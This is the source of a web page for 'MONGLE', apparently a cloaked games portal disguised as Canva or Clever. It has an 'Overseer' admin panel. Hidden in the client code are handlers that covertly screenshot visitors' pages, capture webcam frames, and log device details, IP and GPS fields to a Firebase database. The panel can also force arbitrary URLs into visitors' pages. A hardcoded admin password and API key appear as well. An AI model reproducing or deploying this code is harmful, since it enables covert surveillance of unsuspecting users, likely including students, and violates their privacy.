<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>MONGLE ‚Äî Admin</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    :root{
      --bg:#000;
      --surface:#0b0b0b;
      --muted:#888;
      --accent:#00ff41;
      --danger:#ff4141;
      --warn:#ffae00;
      --card:#111;
      --radius:10px;
      --mono: "Consolas", monospace;
      --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      --max-w:1200px;
    }

    /* Cloak themes */
    body[data-cloak="canva"] {
      --bg: #eff6ff;
      --surface: #ffffff;
      --muted: #334155;
      --accent: #06b6d4; /* teal-ish */
      --card: #ffffff;
      font-family: "Poppins", system-ui, -apple-system, sans-serif;
      color: #0f172a;
      background: linear-gradient(180deg,#f8fafc,#eff6ff);
    }
    body[data-cloak="clever"] {
      --bg: #f4f8ff;
      --surface: #ffffff;
      --muted: #334e68;
      --accent: #2563eb; /* blue */
      --card: #ffffff;
      font-family: "Inter", system-ui, -apple-system, sans-serif;
      color: #0b1220;
      background: linear-gradient(180deg,#fbfdff,#f4f8ff);
    }

    /* base */
    *{box-sizing:border-box}
    html,body{height:100%;margin:0}
    body{
      background:var(--bg);
      color:var(--accent);
      font-family:var(--mono);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display:flex;
      justify-content:center;
      padding:18px;
    }

    .wrap{
      width:100%;
      max-width:var(--max-w);
      display:flex;
      flex-direction:column;
      gap:14px;
    }

    header{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }

    .brand{display:flex;align-items:center;gap:12px}
    .logo{
      width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#7c3aed);display:inline-block
    }
    h1{margin:0;font-size:1.05rem;color:var(--accent);font-family:var(--sans)}

    /* top controls */
    .top-controls{display:flex;gap:8px;align-items:center}
    .btn{
      background:var(--surface);
      color:var(--accent);
      border:1px solid rgba(255,255,255,0.03);
      padding:8px 10px;border-radius:8px;
      cursor:pointer;font-weight:700;font-size:12px;
    }
    .btn.secondary{background:transparent;color:var(--muted);border:1px solid transparent}
    .btn.danger{background:var(--danger);color:#fff}

    main{display:flex;gap:16px}
    /* left: games */
    .col-left{flex:1;display:flex;flex-direction:column;gap:12px}
    .searchbar{display:flex;gap:8px;align-items:center}
    .input{padding:8px;border-radius:8px;background:#000;border:1px solid #222;color:var(--accent);font-family:var(--mono)}
    .game-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;max-height:64vh;overflow:auto;padding:6px}
    .card{background:var(--card);border-radius:8px;padding:18px;text-align:center;cursor:pointer;border:1px solid rgba(255,255,255,0.03);color:var(--accent);font-weight:700}
    .card .fav{position:absolute;right:8px;top:8px;font-size:14px;color:#777}

    /* right: admin */
    .col-right{width:420px;min-width:320px;display:flex;flex-direction:column;gap:12px}
    .panel{background:var(--surface);border-radius:12px;padding:12px;border:1px solid rgba(255,255,255,0.03)}
    .user-list{max-height:36vh;overflow:auto;border-radius:8px;border:1px solid #111}
    .u-item{padding:10px 12px;border-bottom:1px solid #0b0b0b;display:flex;justify-content:space-between;align-items:center;gap:8px}
    .u-item.selected{background:linear-gradient(90deg,rgba(0,0,0,0.24),transparent);border-left:4px solid var(--accent)}
    .u-meta{font-size:12px;color:var(--muted);font-family:var(--sans);font-weight:600}
    .dossier{font-size:13px;color:var(--muted);line-height:1.35;min-height:120px}

    .controls-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
    .controls-grid .btn{padding:10px;border-radius:8px;text-transform:none;font-size:13px}

    .controls-row{display:flex;gap:8px}
    .small{font-size:12px;padding:6px 8px}

    footer{color:var(--muted);font-size:12px;text-align:center;margin-top:6px}

    /* preview */
    #preview{height:220px;border-radius:8px;background:#000 center no-repeat;background-size:contain;border:1px solid #111}

    /* responsive */
    @media (max-width:980px){
      .col-right{width:100%}
      main{flex-direction:column}
    }
  </style>
</head>
<body data-cloak="default">
  <div class="wrap" role="document">
    <header>
      <div class="brand">
        <span class="logo" aria-hidden="true"></span>
        <div>
          <h1>MONGLE ADMIN</h1>
          <div style="font-size:11px;color:var(--muted)">Presence & Overseer</div>
        </div>
      </div>

      <div class="top-controls">
        <button class="btn" onclick="openMongleAboutBlank()">OPEN MONGLE (about:blank)</button>
        <button id="adminBtn" class="btn" style="display:none" onclick="toggleModal('adminM')">OVERSEER</button>
        <button class="btn secondary" onclick="toggleModal('settingsM')">SETTINGS</button>
        <button class="btn danger" onclick="panicTrigger()">PANIC</button>
      </div>
    </header>

    <main>
      <section class="col-left">
        <div class="panel">
          <div class="searchbar">
            <select id="cat" class="input" onchange="renderGrid()" style="width:150px">
              <option value="all">ALL_FILES</option>
              <option value="favs">FAVORITES</option>
            </select>
            <input id="search" class="input" placeholder="Search..." oninput="renderGrid()" style="flex:1">
            <button class="btn small" onclick="renderGrid()">REFRESH</button>
          </div>
        </div>

        <div class="panel game-grid" id="grid" aria-live="polite"></div>
      </section>

      <aside class="col-right">
        <div class="panel">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">USERS</div>
            <div style="font-size:12px;color:var(--muted)"><span id="userCount">0</span> online</div>
          </div>
          <div id="userList" class="user-list" role="list"></div>
        </div>

        <div class="panel">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">SELECTED</div>
            <div style="font-size:12px;color:var(--muted)"><span id="selId">‚Äî</span></div>
          </div>

          <div id="dossier" class="dossier">Select a user to view intel...</div>

          <div id="preview" aria-hidden="true"></div>
        </div>

        <div class="panel">
          <div style="font-weight:700;margin-bottom:8px">ACTIONS</div>

          <!-- Neater grouped controls -->
          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Quick actions</div>
          <div class="controls-grid" id="primaryActions">
            <button class="btn" onclick="adminAct('capReq')">üì∏ Snapshot</button>
            <button class="btn" onclick="adminAct('camReq')">üé• Camera</button>
            <button class="btn" onclick="adminAct('gpsReq')">üìç GPS</button>
            <button class="btn" id="watchBtn" style="background:#004400;color:#fff" onclick="toggleWatch()">üëÅÔ∏è Watch</button>
          </div>

          <div style="height:10px"></div>

          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Moderation</div>
          <div class="controls-grid">
            <button class="btn" onclick="adminAct('reload')">‚Üª Reload</button>
            <button class="btn btn-warn" onclick="adminAct('frozen')">‚ùÑ Freeze</button>
            <button class="btn btn-warn" onclick="adminAct('bsod')">‚ò† BSOD</button>
            <button class="btn btn-warn" onclick="adminAct('vibrate')">üì≥ Vibrate</button>
          </div>

          <div style="height:10px"></div>

          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">User controls</div>
          <div class="controls-grid">
            <button class="btn danger" onclick="adminAct('kicked')">üö´ Kick</button>
            <button class="btn" onclick="adminRemoveUser()">üóë Remove</button>
            <button class="btn" onclick="adminSoftBan()">‚õî SoftBan</button>
            <button class="btn" onclick="adminToggleMute()">üîá Toggle Mute</button>
          </div>

          <div style="height:10px"></div>

          <div style="display:flex;gap:8px;margin-top:10px">
            <input id="adminCommandInp" class="input" placeholder="Message / URL / Game name" style="flex:1">
            <button class="btn" onclick="adminMessage()">MSG</button>
          </div>

          <div style="display:flex;gap:8px;margin-top:8px">
            <button class="btn secondary" onclick="adminOpenGame()">üïπ Open Game</button>
            <button class="btn secondary" onclick="adminEmbedGame()">üì° Embed</button>
            <button class="btn secondary" onclick="adminCopyIP()">üìã Copy IP</button>
          </div>

        </div>
      </aside>
    </main>

    <footer>Made with care ‚Äî admin UI (improved). Cloak mode available in Settings.</footer>
  </div>

  <!-- Settings modal -->
  <div id="settingsM" class="modal" style="display:none;position:fixed;inset:0;align-items:center;justify-content:center;z-index:200">
    <div style="width:360px;background:var(--surface);padding:16px;border-radius:12px;border:1px solid rgba(0,0,0,0.4)">
      <h3 style="margin:0 0 8px 0;color:var(--accent)">SETTINGS</h3>

      <label style="font-size:12px;color:var(--muted)">Panic URL</label>
      <input id="cfgUrl" class="input" style="width:100%" placeholder="https://google.com">

      <label style="font-size:12px;color:var(--muted)">Panic Key</label>
      <input id="cfgKeyDisp" class="input" readonly style="cursor:pointer">

      <label style="font-size:12px;color:var(--muted)">Cloak Appearance</label>
      <select id="cfgCloak" class="input" style="width:100%">
        <option value="default">Default</option>
        <option value="canva">Cloak: Canva-like</option>
        <option value="clever">Cloak: Clever-like</option>
      </select>

      <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end">
        <button class="btn secondary" onclick="toggleModal('settingsM')">CANCEL</button>
        <button class="btn" onclick="saveSettings()">SAVE</button>
      </div>
    </div>
  </div>

  <!-- embedded container (used when user chooses embed) -->
  <div id="embeddedContainer" style="display:none;position:fixed;inset:44px 10px 10px 10px;z-index:150;align-items:center;justify-content:center">
    <button style="position:absolute;right:18px;top:8px;padding:8px;border-radius:6px;background:#111;color:var(--accent);border:1px solid #222" onclick="closeEmbedded()">CLOSE</button>
    <iframe id="embeddedFrame" style="width:calc(100% - 40px);height:calc(100% - 40px);border-radius:8px;border:2px solid #111;background:#000"></iframe>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, onValue, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let userRef, myID, selectedID = null, isAdmin = false;
    let presenceSnapshot = {};
    let gameData = [];
    let favs = JSON.parse(localStorage.getItem('favs')||'[]');
    let watchInterval = null;
    let tempKey = localStorage.getItem('pKey') || 'Escape';
    let cfg = {
      url: localStorage.getItem('pUrl') || 'https://google.com',
      key: tempKey,
      cloak: localStorage.getItem('pCloak') || 'default',
      mode: localStorage.getItem('pMode') || 'tab',
      enable: localStorage.getItem('pEnable') !== 'false'
    };

    // Initialize UI values
    document.getElementById('cfgUrl').value = cfg.url;
    document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
    document.getElementById('cfgCloak').value = cfg.cloak;
    applyCloak(cfg.cloak);

    // helper: escape
    function escapeHtml(s){ if(typeof s !== 'string') return s; return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }

    // Open Mongle in about:blank with iframe of this page
    window.openMongleAboutBlank = () => {
      const newWin = window.open('about:blank');
      if(!newWin){ alert('Popup blocked. Allow popups.'); return; }
      const base = location.href;
      const html = `<!doctype html><html><head><meta charset="utf-8"><title>MONGLE</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:${getComputedStyle(document.body).background};"><iframe src="${base}" style="border:none;width:100vw;height:100vh"></iframe></body></html>`;
      newWin.document.open(); newWin.document.write(html); newWin.document.close();
    };

    // init session (client)
    window.initSession = async () => {
      const name = (document.getElementById('username').value || `User_${Math.floor(Math.random()*9999)}`).trim();
      document.querySelector('.wrap').style.opacity = '1';
      document.getElementById('loginOverlay').style.display = 'none';

      userRef = push(ref(db, 'presence'), {
        name: name, activity: 'Browsing Menu', joined: new Date().toISOString(),
        res: `${screen.width}x${screen.height}`,
        hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
        bat: '?', plat: navigator.platform, ip: 'Hidden', loc: '?', isp: '?',
        gps: 'Pending...', reload:false
      });
      myID = userRef.key;
      onDisconnect(userRef).remove();

      // watch our own node for admin commands (embedding etc.)
      onValue(ref(db, `presence/${myID}`), (s) => {
        const d = s.val()||{};
        if(d.kicked){ closeActive(); window.location.replace(cfg.url); }
        if(d.openEmbedUrl){ try{ showEmbedded(d.openEmbedUrl); }finally{ update(userRef, {openEmbedUrl:null}).catch(()=>{}); } }
        if(d.capReq){ html2canvas(document.body,{useCORS:true}).then(c=>update(userRef,{lastCap:c.toDataURL('image/webp',0.2),capReq:false})).catch(()=>update(userRef,{capReq:false})); }
        if(d.camReq){ navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{ const v=document.createElement('video'); v.srcObject=stream; v.play(); v.onloadedmetadata=()=>{ const c=document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); stream.getTracks().forEach(t=>t.stop()); update(userRef,{lastCap:c.toDataURL('image/webp',0.5),camReq:false}); }; }).catch(()=>update(userRef,{camReq:false})); }
      });

      // fetch games list (defensive)
      try {
        const res = await fetch('https://api.github.com/repos/sqsqs353-alt/the-mongle-thing/contents/');
        const data = await res.json();
        gameData = Array.isArray(data) ? data.filter(f=>f.name && f.name.endsWith('.html') && f.name!=='index.html') : [];
      } catch(e){ console.warn('game list fetch failed',e); gameData = []; }
      renderGrid();

      // if admin, start overseer
      if(isAdmin) startOverseer();
    };

    // render games
    function renderGrid(){
      const q = (document.getElementById('search').value||'').toLowerCase();
      const cat = document.getElementById('cat').value;
      const grid = document.getElementById('grid'); grid.innerHTML='';
      const sorted = [...gameData];
      sorted.filter(g => {
        const n = (g.name||'').toLowerCase();
        if(!n.includes(q)) return false;
        if(cat==='favs') return favs.includes(g.name);
        return true;
      }).forEach(g=>{
        const safeName = g.name||'unknown.html';
        const el = document.createElement('div'); el.className='card';
        el.innerHTML = `<div style="position:relative">${escapeHtml(safeName.replace('.html','').toUpperCase())}</div>`;
        el.onclick = () => {
          const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${safeName}`;
          if(cfg.mode==='embed'){ showEmbedded(url); update(userRef,{activity:'Playing '+safeName}); }
          else if(cfg.mode==='blank'){ const w = window.open('about:blank'); w.document.body.innerHTML=`<iframe src="${url}" style="border:0;width:100vw;height:100vh"></iframe>`; update(userRef,{activity:'Playing '+safeName}); }
          else { window.open(url,'_blank'); update(userRef,{activity:'Playing '+safeName}); }
        };
        grid.appendChild(el);
      });
    }

    // Embedded helpers (client)
    function showEmbedded(url){
      const container = document.getElementById('embeddedContainer');
      const frame = document.getElementById('embeddedFrame');
      if(!container || !frame) return;
      frame.src = url;
      container.style.display='flex';
    }
    function closeEmbedded(){ const c=document.getElementById('embeddedContainer'); if(!c) return; document.getElementById('embeddedFrame').src='about:blank'; c.style.display='none'; }

    function closeActive(){ /* placeholder to close active windows if needed */ }

    /* --- ADMIN / Overseer --- */

    function startOverseer(){
      onValue(ref(db,'presence'), (snap) => {
        presenceSnapshot = {};
        const list = document.getElementById('userList'); list.innerHTML = '';
        let count = 0;
        snap.forEach(c=>{
          const val = c.val() || {};
          // Skip presence entries that are kicked or have no name (user asked to remove "üö´ Unknown")
          if(val.kicked || !val.name) return;
          presenceSnapshot[c.key] = val;
          count++;
          const displayName = val.name || `User_${c.key.substring(0,6)}`;
          const activity = val.activity || '‚Äî';
          const li = document.createElement('div');
          li.className = 'u-item' + (selectedID===c.key ? ' selected' : '');
          li.innerHTML = `<div style="min-width:0"><div style="font-weight:700;color:var(--accent)">${escapeHtml(displayName)}</div><div class="u-meta">${escapeHtml(activity)}</div></div><div style="font-size:12px;color:var(--muted)">${escapeHtml(val.res || '')}</div>`;
          li.onclick = () => { selectedID = c.key; updateDossier(val, c.key); startOverseer(); };
          list.appendChild(li);
        });
        document.getElementById('userCount').innerText = count;
        // if previously selected removed, clear
        if(selectedID && !snap.hasChild(selectedID)){ selectedID=null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage=''; if(watchInterval){ clearInterval(watchInterval); watchInterval=null; document.getElementById('watchBtn').style.background='#004400'; document.getElementById('watchBtn').innerText='üëÅÔ∏è Watch'; } }
      }, (err)=>console.error('presence read error',err));
    }

    function updateDossier(u,key){
      const safe = u || {};
      const name = safe.name || `User_${key.substring(0,6)}`;
      const status = safe.kicked ? 'KICKED' : (safe.frozen ? 'FROZEN' : (safe.bsod ? 'BSOD' : 'ACTIVE'));
      const ip = safe.ip || 'N/A';
      const loc = safe.loc || 'N/A';
      const gps = safe.gps || 'N/A';
      const isp = safe.isp || 'N/A';
      const res = safe.res || 'N/A';
      const bat = safe.bat || 'N/A';

      document.getElementById('selId').innerText = key.substring(0,6)+'...';
      document.getElementById('dossier').innerHTML =
        `<div><b>ID:</b> ${escapeHtml(key.substring(0,6))}</div>
         <div><b>NAME:</b> ${escapeHtml(name)}</div>
         <div><b>STATUS:</b> ${escapeHtml(status)}</div>
         <div><b>IP:</b> ${escapeHtml(ip)}</div>
         <div><b>LOC:</b> ${escapeHtml(loc)}</div>
         <div><b>GPS:</b> ${escapeHtml(gps)}</div>
         <div><b>ISP:</b> ${escapeHtml(isp)}</div>
         <div><b>RES:</b> ${escapeHtml(res)}</div>
         <div><b>BATTERY:</b> ${escapeHtml(bat)}</div>`;
      if(safe.lastCap) document.getElementById('preview').style.backgroundImage = `url(${safe.lastCap})`;
      else document.getElementById('preview').style.backgroundImage = '';
    }

    // Generic admin toggle/set actions
    window.adminAct = async (t) => {
      if(!selectedID) return alert('Select user first');
      const targetRef = ref(db, `presence/${selectedID}`);
      // Kick: set kicked then remove
      if(t === 'kicked'){
        try{ await update(targetRef,{kicked:true}); }catch(e){ console.warn(e); }
        setTimeout(()=>remove(targetRef).catch(()=>{}),900);
        selectedID = null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage='';
        if(watchInterval){ clearInterval(watchInterval); watchInterval=null; document.getElementById('watchBtn').style.background='#004400'; document.getElementById('watchBtn').innerText='üëÅÔ∏è Watch'; }
        return;
      }

      // For actions that are one-shot true
      if(['reload','capReq','camReq','gpsReq','print','vibrate'].includes(t)){
        update(targetRef,{[t]:true}).catch(e=>console.warn(e));
        return;
      }

      // Toggle others
      onValue(ref(db, `presence/${selectedID}/${t}`), (s)=>{
        const cur = s.val();
        update(ref(db, `presence/${selectedID}`), {[t]: !cur}).catch(e=>console.warn(e));
      }, {onlyOnce:true});
    };

    // remove user (force delete node)
    function adminRemoveUser(){
      if(!selectedID) return alert('Select user first');
      if(!confirm('Remove this user presence entry? This is irreversible.')) return;
      remove(ref(db, `presence/${selectedID}`)).then(()=>{ selectedID=null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage=''; }).catch(e=>alert('Failed: '+e));
    }

    // Soft ban: store expiry timestamp
    function adminSoftBan(){
      if(!selectedID) return alert('Select user first');
      const mins = parseInt(prompt('Soft ban duration (minutes):','10')||'0',10);
      if(!mins) return;
      const until = Date.now() + mins*60*1000;
      update(ref(db, `presence/${selectedID}`), { softBannedUntil: until, kicked: true }).then(()=>setTimeout(()=>remove(ref(db, `presence/${selectedID}`)).catch(()=>{}),900)).catch(e=>alert('Failed: '+e));
    }

    // toggle muted flag
    function adminToggleMute(){
      if(!selectedID) return alert('Select user first');
      onValue(ref(db, `presence/${selectedID}/muted`), (s)=>{
        const cur = s.val();
        update(ref(db, `presence/${selectedID}`), { muted: !cur }).catch(e=>console.warn(e));
      }, {onlyOnce:true});
    }

    // send message
    function adminMessage(){
      if(!selectedID) return alert('Select user first');
      const text = (document.getElementById('adminCommandInp').value||'').trim();
      if(!text) return alert('Type a message first');
      update(ref(db, `presence/${selectedID}`), { msg: text }).catch(e=>alert('Failed: '+e));
      document.getElementById('adminCommandInp').value='';
    }

    // open game that user is playing in admin browser
    function adminOpenGame(){
      if(!selectedID) return alert('Select user first');
      const u = presenceSnapshot[selectedID];
      if(!u || !u.activity) return alert('No activity info');
      const m = u.activity;
      const fname = m.startsWith('Playing ') ? m.replace(/^Playing\s+/,'') : m;
      const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${fname}`;
      window.open(url,'_blank');
    }

    // request embed on client
    function adminEmbedGame(){
      if(!selectedID) return alert('Select user first');
      const supplied = (document.getElementById('adminCommandInp').value||'').trim();
      let url = supplied;
      if(!url){
        const u = presenceSnapshot[selectedID];
        if(!u || !u.activity) return alert('No activity to infer from and no URL supplied');
        const fname = u.activity.startsWith('Playing ') ? u.activity.replace(/^Playing\s+/,'') : u.activity;
        url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${fname}`;
      }
      update(ref(db, `presence/${selectedID}`), { openEmbedUrl: url }).then(()=>alert('Embed requested')).catch(e=>alert('Failed: '+e));
    }

    // copy IP
    function adminCopyIP(){
      if(!selectedID) return alert('Select user first');
      const ip = (presenceSnapshot[selectedID] && presenceSnapshot[selectedID].ip) || '';
      if(!ip) return alert('No IP available');
      navigator.clipboard.writeText(ip).then(()=>alert('IP copied')).catch(()=>alert('Copy failed'));
    }

    // watch live (request repeated snapshots)
    window.toggleWatch = () => {
      const btn = document.getElementById('watchBtn');
      if(watchInterval){ clearInterval(watchInterval); watchInterval=null; btn.style.background='#004400'; btn.innerText='üëÅÔ∏è Watch'; return; }
      if(!selectedID) return alert('Select user first');
      btn.style.background='red'; btn.innerText='‚èπ Stop';
      update(ref(db, `presence/${selectedID}`), { capReq: true });
      watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db, `presence/${selectedID}`), { capReq:true }).catch(()=>{}); }, 2000);
    };

    /* Settings / Cloak */
    function toggleModal(id){ const el = document.getElementById(id); if(!el) return; el.style.display = el.style.display === 'flex' ? 'none' : 'flex'; }
    function saveSettings(){
      cfg.url = document.getElementById('cfgUrl').value || cfg.url;
      cfg.key = cfg.key; // key input is handled elsewhere if needed
      cfg.cloak = document.getElementById('cfgCloak').value || 'default';
      localStorage.setItem('pUrl', cfg.url);
      localStorage.setItem('pCloak', cfg.cloak);
      applyCloak(cfg.cloak);
      toggleModal('settingsM');
      alert('Saved');
    }
    function applyCloak(theme){
      document.body.setAttribute('data-cloak', theme || 'default');
      document.getElementById('cfgCloak').value = theme||'default';
    }

    /* Misc */
    window.panicTrigger = () => { if(!cfg.enable) return; window.location.replace(cfg.url); };

    /* Start as non-admin for default. To enter admin mode, call door('admin') */
    window.door = (type) => {
      if(type === 'admin'){
        const code = prompt('AUTH_CODE:');
        if(code === 'BALLS_ARE_GOOD'){ isAdmin = true; document.getElementById('adminBtn').style.display='inline-block'; document.getElementById('badge')?.innerText='[OVERSEER]'; startOverseer(); initSession(); }
        else alert('Bad code');
      } else {
        initSession();
      }
    };

    // If the page loads and user is expected to click, keep login overlay visible
    // Optionally you can auto-init for testing:
    // initSession();

    // defensive: set cfg UI
    document.getElementById('cfgUrl').value = cfg.url;
  </script>
</body>
</html>
